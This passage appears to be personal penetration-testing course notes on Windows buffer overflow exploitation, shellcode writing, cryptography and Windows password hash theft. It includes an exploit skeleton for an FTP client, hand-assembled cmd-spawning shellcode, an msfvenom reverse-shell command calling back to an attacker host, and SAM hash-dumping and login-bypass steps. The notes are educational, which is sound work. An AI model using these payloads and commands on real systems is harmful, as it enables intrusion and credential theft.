run: *!mona suggest* Mona will ask us to provide some information about the payload and will automatically create a Metasploit module for exploiting the application!           After getting the offset value, we have to overwrite the EIP.  The value we overwrite will be used by the RET instruction to return &gt; to our shellcode.            At this point our shellcode is stored at the memory address pointed by ESP, therefore, returning to our shellcode means jumping to that address. The problem is that the address in the stacks changes dynamically.            So we need to find JMP ESP ( or CALL ESP) instruction that is in a fixed location in memory. This way when the program returns, it will automatically jump to the area where our shellcode is stored.            when ASLR is not enabled we can use kernel32.dll functions that are located at fixed addresses. We can jump to this line and back from the kernel32 to the address in ESP (that holds the first line of our shellcode).       Overwriting the EIP      To find CALL/JMP ESP &gt; loads the .dll to immunity (or IDA) then search For one of two commands:    CALL ESP or JMP ESP   In Immunity Debugger:  \tCTRL+F or Search For &gt; Command \tJMP ESP or CALL ESP      We can find with findjmp2 tool.       findjmp.exe ntdll.dll esp           with mona       !mona jmp -r esp    !mona jmp -r esp -m kernel = if we wanna to use specific module -r = register -m = module                Remember we are working on little-endian systems. So we have to revert the address. in this case: 0x77267D3B = \\x3B\\x7D\\x26\\x77       After getting the address of a CALL ESP we need to create a payload that exploits the BoF vuln.      Overview: We need to overwrite the EIP to point to our JMP ESP, while ESP has been updated to point to the NOPs at the beginning of our shellcode    Exploiting a Real-World Buffer Overflow     ElectraSoft 32Bit FTP    #!/usr/bin/python  from socket import *  payload = \"Here we will insert the payload\"  s = socket(AF_INET, SOCK_STREAM) s.bind((\"127.0.0.1\", 21)) s.listen(1) print \"[+] Listening on [FTP] 21\" c, addr = s.accept()  print \"[+] Connection accepted from: %s\" % (addr[0])  c.send(\"220 \"+payload+\"\\r\\n\") c.recv(1024) c.close() print \"[+] Client exploited !! quitting\" s.close()       In order to this to work, we had to execute in the same box both the script and the vuln server    BOF101     send fuzz to crash the application    !mona po &lt;EIP&gt; offset = 989 jmp esp = 77267d3b = \\x3B\\x7D\\x26\\x77 payload = junk*&lt;offset&gt; + jmp esp value + NOPs + shell      Security Implementations   Helpful Tools  EMET - Enhanced Mitigation Experience Toolkit \toffers many differente mitigation: DEP, ASLR, SEHOP and more. \thttps://support.microsoft.com/en-us/kb/2458544   ASLR - Address space layout randomization  Introduce randomness For executables, libraries and stack in process address space, making it more difficult For an attacker to predict memory addresses. Nowadays, all OS implement ASLR. The OS loads the same executable at different locations in memory at every reboot. Therefore, exploits that work by targeting known memory locations will not be successful anymore.      info: ASLR is not enabled in all modules, so there could be a dll (or another module) in the address space that does not use it, making the process vulnerable to ASLR bypass attack.       verify if its enabled Process Explorer - http://technet.microsoft.com/en-us/sysinternals/bb896653 Immunity Debugger &gt; !mona modules or !mona noaslr   bypass technique  resource &gt; https://www.corelan.be/ - Non-randomized modules try to find a module that does not have ASLR enabled and then use a simple JMP/CALL ESP from that module. basically what we did earlier. - Bruteforce ASLR can be forced by overwriting the return pointer with plausible addresses until, ath some point, we reach the shellcode. The success depends on how tolerant the application is to receive variations and many exploitation attempts. - NOP-Sled create a big area of NOPs in order to increase the chances to jump to the shellcode. since the processor skips NOPs until it gets to something to execute, more nops we can place before our shellcode, more chances we have to land on one of these nops. the attacker does not need a high degree of accuracy to be successfull. https://www.fireeye.com/blog/threat-research/2013/10/aslr-bypass-apocalypse-in-lately-zero-day-exploits.html   Protective Measures     http://blogs.technet.com/b/srd/archive/2010/12/08/on-the-effectiveness-of-dep-and-aslr.aspx   https://www.corelan.be/index.php/2011/07/03/universal-depaslr-bypass-with-msvcr71-dll-and-mona-py/   https://www.exploit-db.com/docs/english/17914-bypassing-aslrdep.pdf   https://www.corelan.be/index.php/2009/09/21/exploit-writing-tutorial-part-6-bypassing-stack-cookies-safeseh-hw-dep-and-aslr/   DEP - Data Execution Prevention  its a hardware and software defensive measure, DEP helps prevent certain exploits where the attacker injects new code on the stack.      Bypass technique ROP - Return-Oriented Programming - https://cseweb.ucsd.edu/~hovav/talks/blackhat08.html rop consists of finding multiple machine instructions in the program (gadget), in order to create a chain of instructions that do something. since the instructions are part of the stack, DEP does not apply on them. We can use ROP gadgets to call a memory protection function(kernel API such as VirtualProtect) that can be used to mark the stach as executable; This will allow us to run our shellcode. We can also use ROP gadgets to execute direct commands or copy data into executable regions and then jump to it.   https://www.corelan.be/index.php/security/rop-gadgets/   https://www.corelan.be/index.php/2010/06/16/exploit-writing-tutorial-part-10-chaining-dep-with-rop-the-rubikstm-cube/#buildingblocks      If both DEP and ASLR are enabled, code execution is sometimes impossible to achieve in one attempt    Stack Canary (Stack cookie)  its purpose is to modify almost all the functions prologue and epilogue in order to place a small random integer value (canary) right before the return instruction and detect if a buffer overflow occurs. when the bof occurs, the canary is overwritten too.          The function prologue loads the random value in the canary location, and the epilogue makes sure that the value is not corrupted.            Bypass Technique One can try to retrieve or guess the canary value and add it to the payload. If the canary does not match, the exception handler will be triggered. If the attacker can overwrite the Exception Handler Structure (SEH) and trigger an exception before the canary value is checked, the bof could still be executed.       SafeSEH  https://msdn.microsoft.com/en-us/library/9a89h429.aspx https://www.corelan.be/index.php/2009/09/21/exploit-writing-tutorial-part-6-bypassing-stack-cookies-safeseh-hw-dep-and-aslr/   NOP-Sled      DEP      Canary      Shellcoding   Execution of a shellcode  When the shellcode is successfully injected, the instruction pointer register (EIP) is adjusted to point to the shellcode. At this point, the shellcode runs unrestricted.   ways to send:  \tthrough the network (remote buffer overflow) \tthrough the local environment      Its possible For a shellcode to execute when an SEH (Structured Exception Handling) frame activates. The SEH frames store the address to jump to when there is an exception, such as division by zero. By overwriting the return address, the attacker can take control of the execution.    Types of Shellcode   Local shellcode Remote shellcode   Local shellcode = Privilege Escalation  Is used to exploit local processes in order to get higher privileges on that machine.   Remote shellcode = Remote Code Execution (RCE)  Is sent through the netowork along with an exploit. The exploit will allow the shellcode to be injected into the process and executed.      Connect back  → intiates a connection back to the attackers machine   Bind shell  → binds a shell (or command prompt) to a certain port on which the attacker can connect   Socket Reuse  → establishes a connection to a vulnerable process that does not close before the shellcode is run. The shellcode can then re-use this connection to communicate with the attacker. However, due to their complexity, they are generally not used.   Staged  → used when the shellcode size is bigger than the space that an attacker can use For injection (within the process)    In this case a small piece of shellcode (stage 1) is executed. This code then fetches a larger piece of shellcode (stage 2) into the process memory and executes it. \tcan be local or remote \tEgg-hunt or Omelet   Egg-hunt shellcode Used when a larger shellcode can be injected into the process but, it is unknown where in the process this shellcode will be actually injected. Its divided into two piece:   \tA small shellcode (egg-hunter) \tThe actual bigger shellcode (egg)   the egg-hunter shellcode has to search For the egg (bigger shellcode) within the process address space.   Omelet shellcode Similar to egg-hunt shellcode, but does not have a larger shellcode (the egg), it has a number of smaller shellcodes (eggs). They are combined together and executed (link a torrent) \tIts used to avoid shellcode detectors. small codes does not raise alarms in the system.      You can also, download and execute shellcodes. Just download from the internet and execute it. This executable can be:    \tdata harvesting tool \tmalware \tbackdoor \tetc      Encoding of Shellcode  C language string functions work till a NULL, or 0 bytes is found. So, shellcodes should be Null-free to guarantee the execution!   types of shellcode encoding     Null-free encoding   Alphanumeric and printable encoding   Null-free  Encoding a shellcode that contains NULL bytes means replacing machine instructions containing zeroes, with instructions that do not contain the zeroes, but that achieve the same tasks.   Alphanumeric  sometimes, target process filters out all non-alphanumeric bytes from the data. In such cases, alphanumeric shellcodes are used.     The instruction become very limited, to avoid that Self-Modifying Code (SMC) is used.      the encoded shellcode is prepended with a smaller decoder (that has to be valid alphanumeric encoded shellcode), which on execution will decode and execute the main body of shellcode.    Example Null-free encoding:         From this, you should notice that the first instruction (mov eax, 0) should be avoided because it has zeroes within its machine code representation.    Debugging a Shellcode  we can test the shellcode in this C program. before send to target.   #include &lt;windows.h&gt;  char code[] = \"shell code will go here!\";   int main(int argc, char **argv)  {    int (*func)();    func = (int (*)()) code;    (int)(*func)();  }   Creating our First Shellcode   Create a shellcode that will cause the thread to Sleep For five seconds   For that we need to search and find the function that does this. https://msdn.microsoft.com/en-us/library/windows/desktop/ms686298(v=vs.85).aspx   In this case it requires one parameter, which specifies the amount of time to sleep in milliseconds:   VOID WINAPI Sleep( __in DWORD dwMilliseconds );   we need to get the sleep address   with Immunity Debugger:  \tdisassemble panel &gt; search For &gt; Name in All modules \tsearch For sleep \t.text region - 0x757D82D0   with Awrin:  \tarwin.exe kernel32.dll Sleep   After getting the address  we need to create a small ASM code that calls this function.  xor eax, eax mov eax, 5000 push eax,  mov ebx, 0x757d82d0 call ebx ----------------------------------- - zero out the eax register - move the milliseconds value into eax (5000) - push the function parameter onto the stack - move the address of Sleep into ebx - call the function- Sleep(ms);      to compile:    \tnasm -f win32 sleep.asm -o sleep.obj      After we have assembled our file, we have to disassemble it. Because we want the byte code of our ASM instructions. we can use objdump: \tobjdump -d -Mintel sleep.obj      edit: we have to remove the spaces and add \\x prefix. Now we can compile the program and run it.       it should waits 5 seconds and then crashes.   A more advanced shellcode   if we wanna do shellcode manually, we need to search how the function works. often, we write in C, c++ &gt; compile &gt; decompile to get the machine code &gt; modify the machine code, take off the spaces and adding \\x prefix &gt; finally compile again   If you want to use: WinExec:  \thttps://msdn.microsoft.com/en-us/library/windows/desktop/ms687393(v=vs.85).aspx   ShellExecute: make sure the program loads Shell32.dll \thttps://msdn.microsoft.com/en-us/library/windows/desktop/bb762153(v=vs.85).aspx   MessageBox: \thttps://msdn.microsoft.com/en-us/library/windows/desktop/ms645505(v=vs.85).aspx   ShellExecute Example  This simple code will spawn a new command prompt and will maximize the window.   #include &lt;windows.h&gt; int main(int argc, char** argv) { \tShellExecute(0, \"open\", \"cmd\", NULL, 0, SW_MAXIMIZE); }   Dealing with strings means:     Calculate their hexadecimal value   Push the string   Push a pointer to the string into the stack   Knowing the module is important since we will have to find the address of the function and push it into the stack, similarly to what we did before with the Sleep function.   First thing  To do is to convert the strings (cmd and open) that we will push into the stack.   We will have to push the strings to the stack and then pass a pointer to the string to the ShellExecutionA function (we cannot pass the string itself)   Import things to remember when pushing the strings into the stack  → They must be exactly 4 byte aligned → They must be pushed in the reverse order → Strings must be terminated with \\x00 otherwise the function parameter will load all data in the stack.      String terminators introduce a problem with the NULL-free shellcode. Therefore, if the shellcode must run against string functions (such as strcpy), we will have to edit the shellcode and make it NULL-free.       tips: If u dont know the opcode of a specific assembly instruction, u can use online tools such as:    \thttps://defuse.ca/online-x86-assembler.htm#disassembly or offline tools like Immunity, Metasm, etc      In Immunity: double-click on a random instruction in the main panel &gt; type ASM code that u want to assemble  example: PUSH 0 &gt; the opcode would be: \\x6A = because its PUSHing a byte \\x68 For PUSH a word or a dword.   List of opcdes used:  \thttps://c9x.me/x86/html/file_module_x86_id_269.html   How to convert and push the string ‘calc.exe’     gotta split in groups of 4 characters since we have to push them to the stack:     → \"calc\" → \".exe\"           As mentioned before, the string must be pushed in the reverse order:     → \".exe\" → \"calc\"           we have to convert to ASCII character into hexadecimal values. We can use bash scripts or online tools For this. such as asciitohex or rapidtables.  http://www.asciitohex.com/ http://www.rapidtables.com/convert/number/ascii-to-hex.htm     → \"\\x2e\\x65\\x78\\x65\" &gt; \".exe\" → \"\\x63\\x61\\x6c\\x63\" &gt; \"calc\"           Wanna push the string into stack? add the push bytecode at the beginning of each line (\\x68)      → \"\\x68\\x2e\\x65\\x78\\x65\" // PUSH \".exe\"    → \"\\x68\\x63\\x61\\x6c\\x63\" // PUSH \"calc\"       To terminate the string. We have to add \\x00 value right after calc.exe            we need to fill with spaces, cause remember. we need to send 4 bytes         → \"\\x68\\x20\\x20\\x20\\x00\" // the \\x00 is the terminator, the \\x20 is the hex value of space character → \"\\x68\\x2e\\x65\\x78\\x65\" // PUSH \".exe\" → \"\\x68\\x63\\x61\\x6c\\x63\" // PUSH \"calc\"                           Creating our shellcode - To open a CMD      Calculate the opcodes to push the string ‘cmd’ and ‘open’     → \"\\x68\\x63\\x6d\\x64\"       // PUSH \"cmd\" onto the stack → \"\\x68\\x6f\\x70\\x65\\x6e\" // PUSH \"open\" onto the stack           Notice that the first PUSH is not 4 bytes and there isnt the string terminator at the end.      → \"\\x68\\x63\\x6d\\x64\\x00\"   // PUSH \"cmd\" and terminates the string with \\x00 = now its 4 bytes →  \"\\x6A\\x00\"                      // PUSH 0: Terminates the string 'open' by directly pushing \\x00 onto the stack → \"\\x68\\x6f\\x70\\x65\\x6e\"   // PUSH \"open\"              The ShellExecuteA function, require a pointer to theses strings, we will have to save a pointer to each string using a register.   then we will save the current stack position into a register. When we push the string, ESP will be aligned to the top of the stack. Hence, it will point to the string itself.   Storing this value in a register (such as EBX or ECX) allows us to save a pointer to that string. Then we will just have to pass the pointer as an argument of the function.   To save the pointer into a register: after the push instruction of our shellcode     mov ebx, esp           lets update our code     → \"\\x68\\x63\\x6d\\x64\\x00\"   // PUSH \"cmd\" and terminates the string with \\x00 = now its 4 bytes    → \"\\x8B\\xDC\"                       // MOV EBX, ESP                                                // puts the pointer to the text \"cmd\" into ebx    →  \"\\x6A\\x00\"                      // PUSH 0: string terminator For 'open'    → \"\\x68\\x6f\\x70\\x65\\x6e\"   // PUSH \"open\"    → \"\\x8B\\xCC\"                      // MOV ECX, ESP                                               // puts the pointer to the text 'open' into ecx      looking at the assembled code, we have to pass +4 parameters, 0003 reverse order &gt; 300  0   There is several ways to execute a ‘push 3’ instruction:       just push 3   move the value to a register, then push the register itself   zero out the register, then increment the register 3 times   etc           \"\\x6A\\x03\" // PUSH 3     now the zeros     \"\\x33\\xc0\"  // xor eax, eax =&gt; zero out the eax register \"\\x50\"        // push eax =&gt; pushes 0 \"\\x50\"        // push eax =&gt; pushes 0           push strings     now we have to push the string ‘open’ ‘cmd’ as we know, we cannot push the strings directly, first we need to assign the string to a register and then push the register. we already did that previously with ebx (cmd) and ecx (open).    \"\\x53\" // push ebx \"\\x51\" // push ecx         we need to push the last zero, sice eax value is still 0, we can push the eax:     \"\\x50\" // push eax =&gt; pushes 0           almost done, we need to search For the address of ShellExecuteA function. to find the address we will use arwin:       arwin.exe Shell32.dll ShellExecuteA   'ShellExecuteA is located at 0x762bd970 in Shell32.dll'           we will move the address to a register, and then call the register. we will not use eax as zero anymore, so we can move to that. dont forget to reverse the address, cause we are in windows (little-endian)     \"\\xB8\\x70\\xD9\\x2b\\x76\" // mov eax, 762bd970 - address of ShellExecuteA \"\\xff\\xD0\"                       // call eax           final shellcode  \"\\x68\\x63\\x6d\\x64\\x00\" \"\\x8B\\xDC\" \"\\x6A\\x00\" \"\\x68\\x6f\\x70\\x65\\x6e\" \"\\x8B\\xCC\" \"\\x6A\\x03\" \"\\x33\\xc0\" \"\\x50\" \"\\x50\" \"\\x53\" \"\\x51\" \"\\x50\" \"\\xB8\\x70\\xD9\\x2b\\x76\" \"\\xff\\xD0\"   shellcode explained     → \"\\x68\\x63\\x6d\\x64\\x00\"   // PUSH \"cmd\" and terminates the string with \\x00 = now its 4 bytes    → \"\\x8B\\xDC\"                       // MOV EBX, ESP =&gt; puts the pointer to the text \"cmd\" into ebx    →  \"\\x6A\\x00\"                      // PUSH 0: string terminator For 'open'    → \"\\x68\\x6f\\x70\\x65\\x6e\"   // PUSH \"open\" onto the stack    → \"\\x8B\\xCC\"                      // MOV ECX, ESP =&gt; puts the pointer to the text 'open' into ecx    → \"\\x6A\\x03\" // PUSH 3 =&gt; the last argument    → \"\\x33\\xc0\"  // xor eax, eax =&gt; zero out the eax register    → \"\\x50\"        // push eax =&gt; pushes 0 = the second to last argument    → \"\\x50\"        // push eax =&gt; pushes 0 = the third to last argument    → \"\\x53\" // push ebx =&gt; push the pointer to string 'cmd'    → \"\\x51\" // push ecx =&gt; push the pointer to string 'open'    → \"\\x50\" // push eax =&gt; pushes 0 = push the first argument    → \"\\xB8\\x70\\xD9\\x2b\\x76\" // mov eax, 762bd970 = move ShellExecuteA into eax    → \"\\xff\\xD0\"                       // call eax = call the function ShellExecuteA      we can test the shellcode, with the c++ debugger code.   the compiler does not automatically load the Shell32.dll library in the program, we have to force the program to load it with the instruction:       LoadLibraryA(\"Shell32.dll\")              if we do not do that, the program will jump to an empy location, and the shellcode will fail.    String terminator  Strings terminator are important markers to instruct where the string For the argument ends. Think of them as ponctuation marks like a ‘.’ or ‘,’     if we do not use the terminator, the program will get others instruction from the code to get the 4 bytes and it will change the whole code.   NULL-free shellcode  we did a shellcode that opens a cmd, but it isnt a null-free shellcode. therefore, if we try to use againts a bof vuln that uses a string function such as strcpy, it will fail.   two ways to get rid of null-bytes: Manual Editing / Encoder tools   Manual Editing  \\x68\\x63\\x6d\\x64’\\x00’ we need to take that null byte from our code.     goal: push the bytecodes 00646d63 to the stack solution: subtract (or add) a specific value in order to remove 00   example:  we if subtract 11111111 from 00646d63 = ef535c52 &gt; which does not contain 00 \t'we can use whatever value that does not contain 00'  1. moves ef535c52 into a register 2. adds back 11111111 to the register (in order to obtain 00646d63) 3. push the value of the register on the stack      before (with null bytes):     \"\\x68\\x63\\x6d\\x64\\x00\" \"\\x8B\\xDC\"                after (null-free): ``` “\\x33\\xDB”                            // xor ebx, ebx: zero out ebx “\\xbb\\x52\\x5c\\x53\\xef”         // mov ebx, ef535c52 “\\x81\\xc3\\x11\\x11\\x11\\x11” // add ebx, 11111111 (now ebx contains 00646d63)   “\\x53”                                   // push ebx “\\x8B\\xDC”                           // mov ebx, esp: puts the pointer to the string   - goal: delete the second string terminator added For the string 'open' solution: we can zero out the eax register and then push its value into the stack; this will automatically push the string terminator.  - before (w/ null bytes):  “\\x6A\\x00” “\\x68\\x6f\\x70\\x65\\x6e” “\\x8B\\xCC”   ---------------------------------------------------------------------------------------------------------------- - after (null-free):  “\\x33\\xC0”                      // xor eax, eax: zero out eax “\\x50”                             // push eax: push the string terminator “\\x68\\x6f\\x70\\x65\\x6e”   // push ‘open’ onto the stack “\\x8B\\xCC”                      // mov ecx, esp: puts the pointer to ‘open’   &gt; there are many others techniques to make a shellcode null-free  ### Using Encoder Tools \thttps://github.com/rapid7/metasploit-framework/wiki/How-to-use-msfvenom  #### Msfvenom problem: shellcode contains the null byte \\x00 solution: use msfvenom in order to encode it and make the shellcode null free  1. Convert the shellcode in a binary file  → echo -ne “\\x68\\x63\\x6d…” &gt; binshellcode.bin \t-n = do not output the trailing newline \t-e = enables interpretation of backslash escapses \t&gt; binshellcode.bin = outputs the result into the file   → python -c ‘print “\\x68\\x63\\x6d…” &gt; binshellcode.bin’  → perl -e ‘print “\\x68\\x63\\x6d…” &gt; binshellcode.bin’   2. Inspect the binary file (optional):  → hexdump binshellcode.bin   3. use msfvenom to encode it:  -b '\\x00' : specify a list of (bad chars) to avoid when generating the shellcode. -a x64 : specifies the architecture to use -p - : instructs msfvenom to read the custom payload from the stdin --plataform win : is used to specify the platform -e x86/shikata_ga_nai : specifies the encoder to use -f c : sets the output format (in this case C)   → cat binshellcode.bin | msfvenom -p - -a x86 –platform win -e x86/shikata_ga_nai -f c -b ‘\\x00’   &gt; We should get a shellcode null-free   Badchars are not always \\x00, they can appear in other hexadecimal values. There are many cases that we cant use them when developing our exploit. We may need to account for the newline ‘( \\n )’ or ‘ (\\x0A in hex) ‘ character for instance;   ## Shellcode and Payload Generators  tools:  msfvenom - https://github.com/rapid7/metasploit-framework/wiki/How-to-use-msfvenom the backdoor factory - https://github.com/secretsquirrel/the-backdoor-factory veil-framework - https://github.com/Veil-Framework/ ```   MSFVENOM  msfvenom --list payloads msfvenom -p windows/messagebox --payload-options   the usage depends on what we want  establish an interactive connection: use a meterpreter payload run a single command: use a cmd payload spawns a message box : windows/messagebox  - example 1 : generate a messagebox shellcode with msfvenom  msfvenom -p windows/messagebox TEXT=\"My first msfvenom shellcode\" -f c -a x86 --platform win  \t-p = windows/messagebox : sets the payload to use \tTEXT=\"...\" : set the text of the messagebox \t-f c : output format of the shellcode \t-a x86 : architecture \t--platform win : target platform For the shellcode     example 2 : reverse interactive meterpreter session  msfvenom -p windows/meterpreter/reverse_tcp lhost=&lt;kali ip&gt; lport=&lt;port&gt; -f c  \t-p = windows/meterpreter/reverse_tcp = tell msfvenom the payload to use \tLHOST=&lt;host IP&gt; : sets the IP address For the connect back of the payload \tLPORT=&lt;port&gt; : sets the port For the connect back of the payload \t-f c : the output format of the shellcode      We should open a listener in msfconsole &gt; exploit/multi/handler       Cryptography and Password Cracking      The art of share information in a secret manner      Encryption is the process of transforming a message into a ciphertext.\t Decryption is the process of retrieving the original message from a ciphertext by using the correct key   4 main issues:  Authentication: claims made by or about the subject are true Confidentiality: information is accessible only to those authorized to have access Integrity: message has not been manipulated/altered in the transfer Non-Repudiation: ensuring that a party in a dispute cannot repudiate, or refute the validity of a statement   Classification of Crypto-Algorithms   Use of keys  Symmetric-key cryptography Public-key cryptography ### Handling of Data Block Cipher \tECB \tCBC Stream Cipher   Symmetric-key Cryptography  both sender and receiver share the same key.   crypto-algorithms:  \tDES (Data Encryption Standard) / 3DES = https://csrc.nist.gov/csrc/media/publications/fips/46/3/archive/1999-10-25/documents/fips46-3.pdf \tAES (Advanced Encryption Standard) = http://csrc.nist.gov/publications/fips/fips197/fips-197.pdf \tRC4 \tBlowfish \tothers   Public-key Cryptography  There are two keys For each peer. public key is freely distributed and the private key which is to be kept secret. public key is usually used For encryption, private is used For decryption. public key aka asymmetric key   RSA problem - http://www.di-mgt.com.au/rsa_alg.html   how plaintext is handled, Classes of algorithms  Block cipher: they handle data in blocks (chunks of 8 bytes or 16 bytes) e,g, DES, AES Stream cipher: Data is handled one byte at a time, e.g. RC4, A5/1   Block Ciphers  → ECB (Eletronic Code Book)    → CBC (Cipher Block Chaining)   ECB  The message is divided into blocks and each block is encrypted separately. ps: this is a deprecated mode   CBC  each ciphertext block is derived from the previous blocks as well. An initialization vector is used For the first block.   public/private key      ECB - Eletronic Code Book      CBC - Cipher Block Chaining      Cryptographic Hash Function  algorithm that produces a fixed length block of bits from a variable length input message. ``` the output is usually called hash or digest. examples: MD5, MD4, SHA1, ... ```   3 Properties     Preimage resistance: it should be infeasible to find a message that has a given hash.   Second preimage resistance: given an input message, it should be infesasible to find another message with the same hash.   Collision resistance: it should be infeasible to find two different messages with the same hash. Such a pair if found, is called a hash collision.      Avalanche effect = A single bit changed in the message will cause a vast change in the final output.    Public Key Infrastructure (PKI)  Set of hardware, software, people, policies and procedures needed to create, manage, store, distribute and revoke digital certificates.   PKI - make sure certificate authority (CA) is effectively certified and verified.   The user identity must be unique For each CA.   X.509  Stardard For public key certificates.   Examples: \tSSL/TLS, SET, S/MIME, IPsec, others      The certificate can be used to verify that a public key belongs to an individual.   The CA acts as a trusted third party   User &lt; CA Private key &lt; Certification Authority This ensures that any communication encrypted with this user public key can be read only by him   CA signs the couple: &lt;USER, USERkey&gt; binding that key to that user \tits like SSL certificates           An SSL certificate hat two purposes:   Provide proof of identity   Provide a secure channel For transmitting data            who forges Root CAs signs can sign every other certificate having it being validated successfully by web browsers.   more about that &gt; http://www.win.tue.nl/hashclash/rogue-ca/       → Web browsers store public keys of root CAs.           SSL  *Authenticity* is verified by verifying the validity of the certificate (validating the digital signature). *Confidentiality* is achieved by handshaking initial channel parameters encrypted with the SSL certificate public key of the web site.      SSL - Secure Sockets Layer. its a secure protocol, that uses PKI and Symmetric encryption. Ensure that a third party cannot tamper or alter the communication between two entities.   Digital Signature  It proves that the message is effectively coming from a given sender.     → the message integrity is preserved. Any message alteration will be detected.    → Hashing are faster than encryption.   http://www.win.tue.nl/hashclash/rogue-ca/            digital signature:      Pretty Good Privacy (PGP)  \tencrypt files \tapply digital signature \tenforce integrity \tfollow the OpenPGP standard (RFC 4880) \tuses public-key cryptography &gt; binds with email address   we have to put trust in that binding because there is no CA confirming that the message belongs effectively to the intended address.   OpenPGP is a set of standards which describes the formats For encrypted messages, keys and digital signatures.   GnuPG (or GPG) is a open source GPL implementation of the standards, found on GNU/Linux systems.   PGP key parts:  the field are similar to those of an x.509 certificate. but a PGP key is not a certificate (no one has signed yet)   what you will need:  your own secret key - thill will be stored encrypted with a passphrase you own public key - and the public keys of your friends and associates   The PGP software stores &gt; keyring ``` - private key are in a file stored encrypted with a passphrase - the public keys dont have to be protected - the keyring also contains copies of other people public keys which are trusted by you - PGP can digitally sign a document or digest (SHA1) - The signature is a manageable length (160 bits can be represented easily in HEX) ```   process  If u wanna encrypt a message PGP generate a symmetric key &gt; then encrypt the symmetric key with the public key The message is then encrypted with the symmetric key.   The algorithms PGP uses  \tRSA, DSS, Diffie-Hellman = public-key encryption \t3DES, IDEA, CAST-128 = Symmetric-key encryption \tSHA-1 = hashing \tZIP = compression   The two approaches to Trust      Secure Shell (SSH)   Network protocol that allows data to be exchanged using a secure channel between two networked devices very common on Unix based systems &gt; replacement of Telnet shell access on the server in a secure way its also used to create tunnels, port forwarding and secure file transfer listens on TCP port 22 by default  SSH tunnels may be used to tunel unencypted traffic over a network through an encrypted channel SSH allows one to tunnel any protocol within a secure channel:     → message protocols, mount remote hard drivers etc  Corporate policies and filters can be bypassed by using SSH tunnels, cause ssh provided a mean to bypass firewall. ```bash ssh -L 3000:homepc:23 bob@sshserver.com ```   -L = initiate a tunnel 3000 = localport homepc = remotehost 23 = remoteport bob@sshserver.com = username@SSH server   \ttelnet localhost:3000      This would connect to your home pc through telnet in a secure way, because it would be routed via SSH tunnel    Cryptographic Attacks  decipher the ciphertext without knowing the key.      Known Plaintext only attack a cryptoanalyst has access to a plaintext and the corresponding ciphertext   Known Ciphertext only attack the attacker only knows the ciphertext but no plaintext   Chosen Plaintext attack its similar to 1 but the plaintext can be attackers choosing   Chosen Ciphertext attack attacker only know the ciphertext of his choosing and works his way back towards the plaintext. Used commonly against public-private key, becayse public-key is widely known and finding private key will defeat the cipher.   Adaptive chosen plaintext/ciphertext attack attacker can choose plaintext or ciphertext respectively one block after the other (based on previous results) which leads to the defeat of the cipher   Common Practical Attacks   Brute Force  attempts every combination of the key as CPU speeds increase and storage becomes more affordable, cracking time become faster an a lot of encryption are becoming obsolete.   Dictionary attack  attempts the most likely keys the attack is only successful if the dictionary contains the key   Rainbow tables  search For the ciphertext within the rainbow table. if present, you will immediately get the corresponding plaintext. http://kestas.kuliukas.com/RainbowTables/ http://ophcrack.sourceforge.net/tables.php http://project-rainbowcrack.com/index.htm#download   Side channel attacks  dont rely just on plaintext/ciphertext to attack crypto algorithms they also take into account physical implementation including the hardware used to encrypt or decrypt data. time taken to perform an encryption, CPU cycles used and even absorbed power variation during the algorithm can produce important information to a crypto analyst.   Birthday Attack  Attack that can discover collisions in hashing algorithms such as MD5 or SHA1   Security Pitfalls     An attacker will not directly attack the cryptographic algorithms, instead they attack their implementation   Some basic point-outs:  → Not destroying plaintext after use    → not dealing with decrypted data carefully    → A system using temporary files to avoid data loss, might leave plaintext or descrypted data or both in the temporary file    → System using more than 1 key, should take care of all keys equally, because a single key leak renders the complete system useless.    → Allowing recovery of old keys can also act as a weak point    → etc   info          attacking network protocols to break a system that uses an unbreakable cryptography algorithm is what happens everyday.       Users are the weakest link of the chain.   they create weak passwords, if strong password are enforced on them, they do not remember.   algorithm can be broken through more or less sophisticated social engineering.      When you think about phishing websites or installed malware that uses keylogging to steal passwords, cryptography or password strength are just useless.    Windows 2000 / XP / 2k3 / vista / 7 / 8 / Passwords   All the passwords in Windows (except DC) are stored in a config database called SAM  SAM = Security Accounts Manager is a database stored as registry file     it stores users passwords in a hashed format:   LM hash   NT hash   LM hash ( LAN Manager Hash)  until Windows Vista if passwords were smaller than 15 characters it would be stored as LM hash     The users password is converted to uppercase   if length is less than 14 bytes its null-padded, otherwise truncated e.g: MYPASSWORD0000   its split into two 7-byte halves: MYPASSW ORD0000   Theses values are used to create two DES keys, one from each 7-byte half, by converting the 7-byte into a bit stream, and inserting a parity bit after every 7 bits. This generates the 64 bits needed For the DES key   Each of these keys is used to DES-encrypt the constant ASCII string “KFS!@#$%”, resulting in two 8-byte ciphertext values.   these two ciphertext values are concatenated to form a 16-byte value, which is the LM hash   NT hash  All passwords from windows 2000 are also stored as NT hashes.     LM hashes are still computed and stored by default up to Windows Vista, for backward compatiblity    Unicode version of the password is hashed using MD4 algorithm to get resulting hash which is stored For later use.   where are the Hashes?  Stored in the Windows SAM file.  Located: C:\\Windows\\System32\\config Located also in registry: HKEY_LOCAL_MACHINE\\SAM   but its not accessible while the OS is running, and requires SYSTEM privileges   Stealing the Hash  Remotely:     Passwords are dumped from the memory of remote system, by loading the password dumping program from remote. This requires at least an administrative account    Tools:  pwdump : http://www.foofus.net/fizzgig/pwdump/ fgdump : http://foofus.net/goons/fizzgig/fgdump/ ophcrack : http://ophcrack.sourceforge.net/ SAMinside : http://web.archive.org/web/20130307204429/http:/insidepro.com/eng/saminside.shtml l0phtCrack : http://www.l0phtcrack.com/ kon-boot : http://www.piotrbania.com/all/kon-boot/   in Meterpreter session: \trun hashdump   Locally:  → Here you need  physical access to the machine. At this point there are two cases:     Running system:   In this case,  a local administrator account is required to download hashes from the memory   If you want to steal hashes from a running system, you must have at least Administrator Privileges. Some situation we cannot reboot the machine of the target For various reasons.   Anyway, if you have the correct access we can use some tools:  \tPwDump.exe localhost \tfgdump.exe \tSAMinside \tophcrack      Off-line system:   In this, passwords hashes are decrypted from the offline password storage file SAM. The key to decrypt SAM is stored in SYSTEM file.   If you have access physically to the offline machine, you have more options than just still hashes.   Mount the partition where Windows is installed:  mkdir /mnt/sda1 mount -t ntfs /dev/sda1 /mnt/sda1 cd /mnt/sda1/WINDOWS/system32/config   With the hashes in hand:  bkhive SYSTEM syskey.txt samdump2 SAM syskey.txt &gt; dummpedhash.txt   Ophcrack live CD: &lt;this seems so old&gt; \tjust boot and the hashes will appear \tu can grab and crack later          we can also change the content of the SAM file instead of stealing   chntpw &gt; clear passwords, change passwords, promote users to administrators            bypass windows login   kon-boot is a software which allows to change contents of a Linux and Windows kernel   it allows to log into a system as root user without typing the correct password or to elevate privileges from current user to root.       What to do with 